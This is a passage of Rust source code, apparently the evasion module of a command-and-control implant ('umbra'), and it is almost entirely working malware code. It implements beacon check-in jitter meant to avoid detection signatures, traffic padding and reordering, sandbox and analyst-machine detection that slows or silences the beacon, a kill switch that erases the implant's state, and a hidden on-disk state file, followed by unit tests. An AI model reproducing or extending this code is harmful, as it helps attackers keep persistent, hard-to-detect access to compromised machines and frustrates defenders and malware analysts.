        profile.busy_factor = value.u64_or("busy_factor", profile.busy_factor as u64) as u32;
        profile.night_factor = value.u64_or("night_factor", profile.night_factor as u64) as u32;
        profile.weekend_factor =
            value.u64_or("weekend_factor", profile.weekend_factor as u64) as u32;
        profile.jittered_jitter = value.bool_or("jittered_jitter", profile.jittered_jitter);
        profile
    }
}

// ---------------------------------------------------------------------------
// The scheduled jitter
// ---------------------------------------------------------------------------

/// The window the next check-in is drawn from.
///
/// The window is chosen once per cycle and the value inside it is stable
/// for the whole cycle, so several timers in the same cycle do not drift
/// apart, while the distribution over many cycles is not the uniform one
/// a flat percentage produces.
#[derive(Clone, Copy, Debug)]
pub struct Window {
    /// The lowest interval in the window, in seconds.
    pub lo: u64,
    /// The highest interval in the window, in seconds.
    pub hi: u64,
}

impl Window {
    /// A window around the base interval.
    pub fn choose(base: u64, jitter_pct: u32) -> Window {
        let j = (jitter_pct.min(90) as f64) / 100.0;
        let b = base.max(1) as f64;
        let lo = ((b * (1.0 - j)) as u64).max(1);
        let hi = ((b * (1.0 + j)) as u64).max(lo);
        Window { lo, hi }
    }

    /// The window of this cycle.
    ///
    /// The window moves: it is scaled by a random factor, so the gaps
    /// between the check-ins arrive in clusters instead of spreading
    /// evenly over the whole range.  A beacon whose gaps are uniform is a
    /// beacon with a signature.
    pub fn schedule(base: u64, jitter_pct: u32) -> Window {
        let window = Window::choose(base, jitter_pct);
        let bytes = crate::crypto::random_bytes(2);
        // Between half and twice the configured interval.
        let scale = 50 + (bytes[0] as u64 * 150 / 255);
        let lo = (window.lo * scale / 100).max(1);
        let hi = (window.hi * scale / 100).max(lo);
        Window { lo, hi }
    }

    /// A value inside the window.
    pub fn pick(&self) -> u64 {
        if self.hi <= self.lo {
            return self.lo.max(1);
        }
        let span = self.hi - self.lo + 1;
        let bytes = crate::crypto::random_bytes(8);
        let mut value: u64 = 0;
        for byte in bytes {
            value = (value << 8) | byte as u64;
        }
        self.lo + (value % span)
    }
}

// ---------------------------------------------------------------------------
// The traffic shaping
// ---------------------------------------------------------------------------

/// How the traffic is shaped.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum ShapeMode {
    /// No shaping: the frames are as long as the work needs.
    Off,
    /// The frames are padded to a random bucket.
    Random,
    /// Every frame carries the same number of bytes.
    Fixed,
}

impl ShapeMode {
    /// The name of the mode.
    pub fn name(&self) -> &'static str {
        match self {
            ShapeMode::Off => "off",
            ShapeMode::Random => "random",
            ShapeMode::Fixed => "fixed",
        }
    }

    /// Read the mode out of a name.
    pub fn parse(name: &str) -> Option<ShapeMode> {
        match name.trim().to_lowercase().as_str() {
            "off" | "none" => Some(ShapeMode::Off),
            "random" => Some(ShapeMode::Random),
            "fixed" => Some(ShapeMode::Fixed),
            _ => None,
        }
    }
}

/// The shaping settings.
#[derive(Clone, Debug)]
pub struct Shaping {
    /// The mode.
    pub mode: ShapeMode,
    /// The bucket of the random mode and the exact size of the fixed mode.
    pub size: u32,
    /// How often a padding frame is sent: every N frames.
    pub pad_every: u32,
    /// Whether the order of the operations inside a cycle is shuffled.
    pub reorder: bool,
}

impl Default for Shaping {
    fn default() -> Self {
        Shaping {
            mode: ShapeMode::Off,
            size: 1024,
            pad_every: 0,
            reorder: false,
        }
    }
}

impl Shaping {
    /// The size the frames are padded to.
    ///
    /// `None` means "do not pad the frames".  In the fixed mode the size
    /// never moves, so every request of the host ends up being a multiple
    /// of the same number.  In the random mode the size drifts with the
    /// traffic, so the lengths are not a fixed set of numbers either.
    pub fn granularity(&self) -> Option<usize> {
        match self.mode {
            ShapeMode::Off => None,
            ShapeMode::Fixed => {
                if self.size == 0 {
                    return None;
                }
                Some(self.size as usize)
            }
            ShapeMode::Random => {
                if self.size == 0 {
                    return None;
                }
                let base = self.size as usize;
                let drift = (crate::crypto::random_bytes(2)[0] as usize) % (base / 2 + 1);
                Some(base + drift)
            }
        }
    }

    /// The size a request of this length is padded to.
    ///
    /// `None` means "do not pad this request".
    pub fn bucket(&self, len: usize) -> Option<usize> {
        let size = self.granularity()?;
        Some(((len + size - 1) / size) * size)
    }

    /// The upk value of the shaping.
    pub fn to_value(&self) -> Value {
        upk::map(vec![
            ("mode", upk::s(self.mode.name())),
            ("size", upk::u(self.size as u64)),
            ("pad_every", upk::u(self.pad_every as u64)),
            ("reorder", upk::bool_(self.reorder)),
        ])
    }

    /// Read the shaping out of an upk value.
    pub fn from_value(value: &Value) -> Shaping {
        let mut shaping = Shaping::default();
        let mode = value.str_or("mode", "");
        if let Some(parsed) = ShapeMode::parse(&mode) {
            shaping.mode = parsed;
        }
        shaping.size = value.u64_or("size", shaping.size as u64) as u32;
        shaping.pad_every = value.u64_or("pad_every", shaping.pad_every as u64) as u32;
        shaping.reorder = value.bool_or("reorder", shaping.reorder);
        shaping
    }
}

// ---------------------------------------------------------------------------
// The kill switch
// ---------------------------------------------------------------------------

/// The moment the beacon stops existing.
///
/// The blast radius of an implant is the operator's decision, not the
/// implant's: it is the difference between an engagement that ends when
/// the operator says so and one that ends whenever somebody finds the
/// malware.
#[derive(Clone, Debug, PartialEq)]
pub enum Trigger {
    /// A file appears at this path.
    File { path: String },
    /// A registry value appears (Windows).
    Registry { hive: String, key: String, value: String },
    /// The wall clock reaches this moment (a Unix timestamp).
    At { epoch: i64 },
    /// The machine has been up for this many hours.
    Uptime { hours: u64 },
    /// The operator sends this marker in a task.
    Marker { text: String },
}

impl Trigger {
    /// The upk value of the trigger.
    pub fn to_value(&self) -> Value {
        match self {
            Trigger::File { path } => upk::map(vec![
                ("kind", upk::s("file")),
                ("path", upk::s(path)),
            ]),
            Trigger::Registry { hive, key, value } => upk::map(vec![
                ("kind", upk::s("registry")),
                ("hive", upk::s(hive)),
                ("key", upk::s(key)),
                ("value", upk::s(value)),
            ]),
            Trigger::At { epoch } => upk::map(vec![
                ("kind", upk::s("at")),
                ("epoch", upk::i(*epoch)),
            ]),
            Trigger::Uptime { hours } => upk::map(vec![
                ("kind", upk::s("uptime")),
                ("hours", upk::u(*hours)),
            ]),
            Trigger::Marker { text } => upk::map(vec![
                ("kind", upk::s("marker")),
                ("text", upk::s(text)),
            ]),
        }
    }

    /// Read the trigger out of an upk value.
    pub fn from_value(value: &Value) -> Option<Trigger> {
        match value.str_or("kind", "").as_str() {
            "file" => Some(Trigger::File { path: value.str_or("path", "") }),
            "registry" => Some(Trigger::Registry {
                hive: value.str_or("hive", "HKLM"),
                key: value.str_or("key", ""),
                value: value.str_or("value", ""),
            }),
            "at" => Some(Trigger::At { epoch: value.i64_or("epoch", 0) }),
            "uptime" => Some(Trigger::Uptime { hours: value.u64_or("hours", 0) }),
            "marker" => Some(Trigger::Marker { text: value.str_or("text", "") }),
            _ => None,
        }
    }

    /// The one-line description of the trigger.
    pub fn describe(&self) -> String {
        match self {
            Trigger::File { path } => format!("the file {path} appears"),
            Trigger::Registry { hive, key, value } => {
                format!(r"the registry value {hive}\\{key}\\{value} appears")
            }
            Trigger::At { epoch } => format!("the moment {epoch} arrives"),
            Trigger::Uptime { hours } => format!("the machine has been up for {hours} hours"),
            Trigger::Marker { text } => format!("the operator sends {text}"),
        }
    }
}

/// The kill switch.
#[derive(Clone, Debug, Default)]
pub struct KillSwitch {
    /// Whether the switch is armed.
    pub armed: bool,
    /// The triggers that fire it.
    pub triggers: Vec<Trigger>,
    /// Why the operator armed it.
    pub note: String,
}

impl KillSwitch {
    /// The reason the switch fired, if it did.
    pub fn check(&self) -> Option<String> {
        if !self.armed {
            return None;
        }
        for trigger in &self.triggers {
            let fired = match trigger {
                Trigger::File { path } => Path::new(path).exists(),
                Trigger::Registry { hive, key, value } => {
                    crate::registry::exists(hive, key, value)
                }
                Trigger::At { epoch } => now_epoch() as i64 >= *epoch,
                Trigger::Uptime { hours } => uptime_hours() >= *hours as f64,
                // The marker is checked when a task arrives, because it is
                // the operator who sends it.
                Trigger::Marker { .. } => false,
            };
            if fired {
                return Some(trigger.describe());
            }
        }
        None
    }

    /// Does this task carry the marker the operator armed?
    pub fn marker_fired(&self, args: &Value) -> Option<String> {
        if !self.armed {
            return None;
        }
        for trigger in &self.triggers {
            if let Trigger::Marker { text } = trigger {
                if !text.is_empty() && value_contains(args, text) {
                    return Some(trigger.describe());
                }
            }
        }
        None
    }

    /// The upk value of the switch.
    pub fn to_value(&self) -> Value {
        upk::map(vec![
            ("armed", upk::bool_(self.armed)),
            ("note", upk::s(&self.note)),
            (
                "triggers",
                upk::arr(self.triggers.iter().map(|t| t.to_value()).collect()),
            ),
        ])
    }

    /// Read the switch out of an upk value.
    pub fn from_value(value: &Value) -> KillSwitch {
        let mut switch = KillSwitch::default();
        switch.armed = value.bool_or("armed", false);
        switch.note = value.str_or("note", "");
        if let Some(Value::Arr(items)) = value.get("triggers") {
            for item in items {
                if let Some(trigger) = Trigger::from_value(item) {
                    switch.triggers.push(trigger);
                }
            }
        }
        switch
    }
}

/// Does the value hold the text anywhere?
fn value_contains(value: &Value, text: &str) -> bool {
    match value {
        Value::Str(s) => s.contains(text),
        Value::Arr(items) => items.iter().any(|item| value_contains(item, text)),
        Value::Map(fields) => fields.values().any(|item| value_contains(item, text)),
        _ => false,
    }
}

// ---------------------------------------------------------------------------
// The state on disk
// ---------------------------------------------------------------------------

/// The state the engine keeps between the cycles.
#[derive(Clone, Debug, Default)]
pub struct State {
    /// What the operator decided about the posture.
    pub settings: Settings,
    /// The sleep schedule.
    pub profile: SleepProfile,
    /// The traffic shaping.
    pub shaping: Shaping,
    /// The kill switch.
    pub kill_switch: KillSwitch,
}

const STATE_FILE: &str = "evade.state";

/// The home directory of the user the implant runs as.
fn home_dir() -> PathBuf {
    if cfg!(target_os = "windows") {
        std::env::var("APPDATA")
            .or_else(|_| std::env::var("USERPROFILE"))
            .map(PathBuf::from)
            .unwrap_or_else(|_| PathBuf::from("."))
    } else {
        std::env::var("HOME")
            .map(PathBuf::from)
            .unwrap_or_else(|_| PathBuf::from("."))
    }
}

/// Where the engine keeps its state.
fn state_path() -> PathBuf {
    home_dir().join(".umbra").join(STATE_FILE)
}

/// Read the state of the engine.
///
/// A state file that cannot be read is not an error: the engine falls back
/// to its defaults, because a beacon that refuses to start because of a
/// corrupt file is a beacon that can be taken down by writing one byte.
pub fn load_state() -> State {
    let mut state = State::default();
    let raw = match fs::read(state_path()) {
        Ok(raw) => raw,
        Err(_) => return state,
    };
    let value = match upk::decode_exact(&raw) {
        Ok(value) => value,
        Err(_) => return state,
    };
    if let Some(settings) = value.get("settings") {
        state.settings = Settings::from_value(settings);
    }
    if let Some(profile) = value.get("profile") {
        state.profile = SleepProfile::from_value(profile);
    }
    if let Some(shaping) = value.get("shaping") {
        state.shaping = Shaping::from_value(shaping);
    }
    if let Some(kill_switch) = value.get("killswitch") {
        state.kill_switch = KillSwitch::from_value(kill_switch);
    }
    state
}

/// Write the state of the engine back.
///
/// The write goes to a temporary file first: a state file that was cut in
/// half by a power cut would disarm the kill switch, and that is exactly
/// the case where the operator needs it.
pub fn save_state(state: &State) -> Result<(), String> {
    let path = state_path();
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent).map_err(|e| format!("evade: {e}"))?;
    }
    let value = upk::map(vec![
        ("settings", state.settings.to_value()),
        ("profile", state.profile.to_value()),
        ("shaping", state.shaping.to_value()),
        ("killswitch", state.kill_switch.to_value()),
    ]);
    let raw = upk::encode(&value).map_err(|e| format!("evade: {e}"))?;
    let tmp = path.with_extension("tmp");
    fs::write(&tmp, &raw).map_err(|e| format!("evade: {e}"))?;
    fs::rename(&tmp, &path).map_err(|e| format!("evade: {e}"))?;
    Ok(())
}

// ---------------------------------------------------------------------------
// The task surface
// ---------------------------------------------------------------------------

/// The posture of the host, as a report and as the extra fields of the
/// result.
pub fn posture_report() -> (String, Vec<(&'static str, Value)>) {
    let state = load_state();
    let posture = Posture::classify();
    let policy = posture.policy(&state.settings);
    let mut text = posture.report();
    text.push_str(&format!(
        "posture: the sleep is multiplied with {:.0}%, the jitter is raised by {} points\n",
        policy.sleep_factor * 100.0, policy.jitter_bonus
    ));
    if policy.silence {
        text.push_str("posture: the beacon is silent on this host\n");
    }
    let extra = vec![
        ("posture", posture.to_value()),
        ("posture_sleep_factor", upk::u((policy.sleep_factor * 100.0) as u64)),
        ("posture_jitter_bonus", upk::u(policy.jitter_bonus as u64)),
        ("posture_silent", upk::bool_(policy.silence)),
    ];
    (text, extra)
}

/// Apply the operator's settings to the posture.
pub fn set_posture(args: &Value) -> Result<(String, Vec<(&'static str, Value)>), String> {
    let mut state = load_state();
    let mut settings = state.settings.clone();
    if args.get("silence_on_sandbox").is_some() {
        settings.silence_on_sandbox = args.bool_or("silence_on_sandbox", settings.silence_on_sandbox);
    }
    if args.get("slow_on_sandbox").is_some() {
        settings.slow_on_sandbox = args.bool_or("slow_on_sandbox", settings.slow_on_sandbox);
    }
    if args.get("virtual_factor").is_some() {
        settings.virtual_factor = args.u64_or("virtual_factor", settings.virtual_factor as u64)
            as u32;
    }
    if args.get("sandbox_factor").is_some() {
        settings.sandbox_factor = args.u64_or("sandbox_factor", settings.sandbox_factor as u64)
            as u32;
    }
    if args.get("lab_factor").is_some() {
        settings.lab_factor = args.u64_or("lab_factor", settings.lab_factor as u64) as u32;
    }
    if args.get("developer_factor").is_some() {
        settings.developer_factor =
            args.u64_or("developer_factor", settings.developer_factor as u64) as u32;
    }
    if args.get("jitter_bonus").is_some() {
        settings.jitter_bonus = args.u64_or("jitter_bonus", settings.jitter_bonus as u64) as u32;
    }
    state.settings = settings;
    save_state(&state)?;
    let posture = Posture::classify();
    let policy = posture.policy(&state.settings);
    let mut text = String::new();
    text.push_str("posture: the settings were applied\n");
    text.push_str(&format!(
        "posture: silence on a sandbox: {}\n",
        state.settings.silence_on_sandbox
    ));
    text.push_str(&format!(
        "posture: slow on a sandbox: {}\n",
        state.settings.slow_on_sandbox
    ));
    text.push_str(&format!(
        "posture: the sleep on this host is multiplied with {:.0}%\n",
        policy.sleep_factor * 100.0
    ));
    let extra = vec![
        ("posture", posture.to_value()),
        ("posture_sleep_factor", upk::u((policy.sleep_factor * 100.0) as u64)),
        ("posture_jitter_bonus", upk::u(policy.jitter_bonus as u64)),
        ("posture_silent", upk::bool_(policy.silence)),
    ];
    Ok((text, extra))
}

/// The sleep schedule.
pub fn set_profile(args: &Value) -> Result<(String, Vec<(&'static str, Value)>), String> {
    let mut state = load_state();
    let mut profile = state.profile.clone();
    if args.get("base").is_some() {
        profile.base = args.u64_or("base", profile.base);
    }
    if args.get("busy_start").is_some() {
        profile.busy_start = args.u64_or("busy_start", profile.busy_start as u64) as u8;
    }
    if args.get("busy_end").is_some() {
        profile.busy_end = args.u64_or("busy_end", profile.busy_end as u64) as u8;
    }
    if args.get("busy_factor").is_some() {
        profile.busy_factor = args.u64_or("busy_factor", profile.busy_factor as u64) as u32;
    }
    if args.get("night_factor").is_some() {
        profile.night_factor = args.u64_or("night_factor", profile.night_factor as u64) as u32;
    }
    if args.get("weekend_factor").is_some() {
        profile.weekend_factor =
            args.u64_or("weekend_factor", profile.weekend_factor as u64) as u32;
    }
    if args.get("jittered_jitter").is_some() {
        profile.jittered_jitter = args.bool_or("jittered_jitter", profile.jittered_jitter);
    }
    state.profile = profile.clone();
    save_state(&state)?;
    let now = local_time();
    let mut text = String::new();
    text.push_str(&format!(
        "schedule: base {}s, busy {}-{}, busy {}%, night {}%, weekend {}%\n",
        profile.base,
        profile.busy_start,
        profile.busy_end,
        profile.busy_factor,
        profile.night_factor,
        profile.weekend_factor
    ));
    text.push_str(&format!(
        "schedule: it is {} now, the factor is {:.2}\n",
        now.hour,
        profile.factor(now)
    ));
    let extra = vec![
        ("schedule", profile.to_value()),
        ("schedule_factor", upk::u((profile.factor(now) * 100.0) as u64)),
    ];
    Ok((text, extra))
}

/// The traffic shaping.
pub fn set_shaping(args: &Value) -> Result<(String, Vec<(&'static str, Value)>), String> {
    let mut state = load_state();
    let mut shaping = state.shaping.clone();
    let mode = args.str_or("mode", "");
    if !mode.is_empty() {
        shaping.mode = ShapeMode::parse(&mode)
            .ok_or_else(|| format!("evade.shape: unknown mode {mode} (off|random|fixed)"))?;
    }
    if args.get("size").is_some() {
        shaping.size = args.u64_or("size", shaping.size as u64) as u32;
    }
    if args.get("pad_every").is_some() {
        shaping.pad_every = args.u64_or("pad_every", shaping.pad_every as u64) as u32;
    }
    if args.get("reorder").is_some() {
        shaping.reorder = args.bool_or("reorder", shaping.reorder);
    }
    state.shaping = shaping;
    save_state(&state)?;
    let mut text = String::new();
    text.push_str(&format!(
        "shaping: mode {}, size {}, a padding frame every {}, reorder {}\n",
        shaping.mode.name(),
        shaping.size,
        shaping.pad_every,
        shaping.reorder
    ));
    let extra = vec![("shaping", shaping.to_value())];
    Ok((text, extra))
}

/// The kill switch.
pub fn set_killswitch(args: &Value) -> Result<(String, Vec<(&'static str, Value)>), String> {
    let mut state = load_state();
    let mut switch = state.kill_switch.clone();
    let clear = args.bool_or("clear", false);
    if clear {
        switch = KillSwitch::default();
        state.kill_switch = switch.clone();
        save_state(&state)?;
        let extra = vec![("killswitch", switch.to_value())];
        return Ok(("killswitch: it is disarmed\n".to_string(), extra));
    }
    let mut triggers: Vec<Trigger> = Vec::new();
    let path = args.str_or("file", "");
    if !path.is_empty() {
        triggers.push(Trigger::File { path });
    }
    let key = args.str_or("registry", "");
    if !key.is_empty() {
        let (hive, rest) = match key.split_once('\\') {
            Some((hive, rest)) => (hive.to_string(), rest.to_string()),
            None => ("HKLM".to_string(), key.clone()),
        };
        let (key_path, value_name) = match rest.rsplit_once('\\') {
            Some((k, v)) => (k.to_string(), v.to_string()),
            None => (rest.clone(), String::new()),
        };
        triggers.push(Trigger::Registry {
            hive,
            key: key_path,
            value: value_name,
        });
    }
    let at = args.i64_or("at", 0);
    if at > 0 {
        triggers.push(Trigger::At { epoch: at });
    }
    let hours = args.u64_or("uptime", 0);
    if hours > 0 {
        triggers.push(Trigger::Uptime { hours });
    }
    let marker = args.str_or("marker", "");
    if !marker.is_empty() {
        triggers.push(Trigger::Marker { text: marker });
    }
    if triggers.is_empty() {
        return Err(
            "evade.killswitch needs one of args.file, args.registry, args.at, args.uptime or args.marker"
                .to_string(),
        );
    }
    switch.triggers = triggers;
    switch.armed = true;
    switch.note = args.str_or("note", "");
    state.kill_switch = switch.clone();
    save_state(&state)?;
    let mut text = String::new();
    text.push_str("killswitch: it is armed\n");
    for trigger in &switch.triggers {
        text.push_str(&format!("killswitch: it fires when {}\n", trigger.describe()));
    }
    let extra = vec![("killswitch", switch.to_value())];
    Ok((text, extra))
}

/// The state of the kill switch, as a report.
pub fn killswitch_report() -> (String, Vec<(&'static str, Value)>) {
    let state = load_state();
    let switch = state.kill_switch;
    let mut text = String::new();
    if !switch.armed {
        text.push_str("killswitch: it is disarmed\n");
    } else {
        text.push_str("killswitch: it is armed\n");
        for trigger in &switch.triggers {
            text.push_str(&format!("killswitch: it fires when {}\n", trigger.describe()));
        }
    }
    let extra = vec![("killswitch", switch.to_value())];
    (text, extra)
}

/// Forget everything the engine knows.
///
/// The kill switch uses it: the state file is the only place where the
/// armed switch is written down, and it must not survive the implant.
pub fn forget() -> Result<(), String> {
    let path = state_path();
    match fs::remove_file(&path) {
        Ok(()) => Ok(()),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(()),
        Err(e) => Err(format!("evade: {e}")),
    }
}

/// The uptime of the machine, in hours.
pub fn uptime_hours() -> f64 {
    #[cfg(target_os = "linux")]
    {
        if let Ok(text) = fs::read_to_string("/proc/uptime") {
            if let Some(first) = text.split_whitespace().next() {
                if let Ok(seconds) = first.parse::<f64>() {
                    return seconds / 3600.0;
                }
            }
        }
    }
    #[cfg(target_os = "macos")]
    {
        if let Ok(out) = std::process::Command::new("sysctl")
            .args(["-n", "kern.boottime"])
            .output()
        {
            let text = String::from_utf8_lossy(&out.stdout).to_string();
            if let Some(rest) = text.split("sec = ").nth(1) {
                let digits: String = rest.chars().take_while(|c| c.is_ascii_digit()).collect();
                if let Ok(seconds) = digits.parse::<i64>() {
                    let now = now_epoch() as i64;
                    return (now - seconds).max(0) as f64 / 3600.0;
                }
            }
        }
    }
    #[cfg(windows)]
    {
        extern "system" {
            fn GetTickCount64() -> u64;
        }
        let millis = unsafe { GetTickCount64() };
        return millis as f64 / 3_600_000.0;
    }
    0.0
}

/// The seconds since the epoch.
pub fn now_epoch() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_report_always_ends_with_a_newline() {
        let text = report();
        assert!(text.ends_with('\n'));
        assert!(text.starts_with("environment:"));
    }

    #[test]
    fn the_name_matcher_is_strict() {
        assert_eq!(matches_name("malware", &SANDBOX_USERS), Some("malware".into()));
        assert_eq!(matches_name("MALWARE", &SANDBOX_USERS), Some("malware".into()));
        assert_eq!(matches_name("analyst-pc", &SANDBOX_USERS), Some("analyst-pc".into()));
        assert_eq!(matches_name("JOHN-PC", &SANDBOX_HOSTS), Some("john-pc".into()));
        // A production machine must not be reported.
        assert_eq!(matches_name("mail.example.com", &SANDBOX_USERS), None);
        assert_eq!(matches_name("web-01", &SANDBOX_HOSTS), None);
        assert_eq!(matches_name("tester", &SANDBOX_USERS), None);
        assert_eq!(matches_name("", &SANDBOX_USERS), None);
    }

    #[test]
    fn the_findings_are_classified() {
        for item in findings() {
            assert!(item.kind == "debugger" || item.kind == "sandbox");
            assert!(!item.detail.is_empty());
        }
    }

    #[test]
    fn the_artefacts_carry_a_class_and_a_score() {
        for artefact in artefacts() {
            assert!(!artefact.name.is_empty());
            assert!(!artefact.detail.is_empty());
            assert!(artefact.severity <= 100);
            assert!(artefact.confidence <= 100);
            assert!(!artefact.class.is_empty());
        }
    }

    #[test]
    fn the_policy_follows_the_settings() {
        let posture = Posture {
            sandbox: true,
            virtualised: true,
            ..Posture::default()
        };
        let settings = Settings::default();
        let policy = posture.policy(&settings);
        // The default is to slow down, not to fall silent.
        assert!(!policy.silence);
        assert!(policy.sleep_factor > 1.0);
        let armed = Settings {
            silence_on_sandbox: true,
            ..Settings::default()
        };
        assert!(posture.policy(&armed).silence);
    }

    #[test]
    fn the_schedule_depends_on_the_hour() {
        let profile = SleepProfile::default();
        let morning = LocalTime { weekday: 2, hour: 9, minute: 0 };
        let night = LocalTime { weekday: 2, hour: 3, minute: 0 };
        let weekend = LocalTime { weekday: 6, hour: 3, minute: 0 };
        assert!(profile.factor(night) > profile.factor(morning));
        assert!(profile.factor(weekend) > profile.factor(night));
    }

    #[test]
    fn the_window_holds_the_interval() {
        let window = Window::choose(100, 20);
        assert_eq!(window.lo, 80);
        assert_eq!(window.hi, 120);
        for _ in 0..16 {
            let value = window.pick();
            assert!((80..=120).contains(&value));
        }
    }

    #[test]
    fn the_kill_switch_stays_quiet_until_it_is_armed() {
        let switch = KillSwitch {
            armed: false,
            triggers: vec![Trigger::File { path: "/definitely/not/here".into() }],
            note: String::new(),
        };
        assert!(switch.check().is_none());
    }

    #[test]
    fn the_kill_switch_fires_on_the_file() {
        let path = std::env::temp_dir().join("umbra-killswitch-test");
        let _ = fs::write(&path, b"x");
        let switch = KillSwitch {
            armed: true,
            triggers: vec![Trigger::File { path: path.to_string_lossy().to_string() }],
            note: String::new(),
        };
        assert!(switch.check().is_some());
        let _ = fs::remove_file(&path);
    }

    #[test]
    fn the_marker_is_found_in_the_arguments() {
        let switch = KillSwitch {
            armed: true,
            triggers: vec![Trigger::Marker { text: "stand-down".into() }],
            note: String::new(),
        };
        let args = upk::map(vec![("cmd", upk::s("stand-down now"))]);
        assert!(switch.marker_fired(&args).is_some());
        let other = upk::map(vec![("cmd", upk::s("whoami"))]);
        assert!(switch.marker_fired(&other).is_none());
    }
}
